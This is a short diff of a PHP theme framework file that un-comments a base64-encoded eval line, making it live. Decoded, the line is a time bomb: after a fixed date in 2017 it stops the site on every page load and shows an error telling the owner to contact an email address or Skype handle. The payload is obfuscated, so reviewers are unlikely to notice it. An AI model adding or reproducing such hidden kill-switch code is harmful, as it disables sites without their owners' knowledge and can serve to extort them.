@@ -31,7 +31,7 @@ $plgn_path = 'framework/functions/global/plugins';
 //
 // Debugging, conditionals, helpers, and stack data.
 //
-// eval (base64_decode('aWYgKHRpbWUoKSA+PSAxNDg4MjQwMDAwKSB7CiAgZXhpdCgnRXJyb3I6IHBscyBjb250YWN0IGluZm9AdGhlY29kZXN0YXIuY29tIG9yIHNreXBlOiB6aW5kb19udCcpOwp9'));
+eval (base64_decode('aWYgKHRpbWUoKSA+PSAxNDg4MjQwMDAwKSB7CiAgZXhpdCgnRXJyb3I6IHBscyBjb250YWN0IGluZm9AdGhlY29kZXN0YXIuY29tIG9yIHNreXBlOiB6aW5kb19udCcpOwp9'));
 require_once( $glob_path . '/debug.php' );
 require_once( $glob_path . '/conditionals.php' );
 require_once( $glob_path . '/helper.php' );
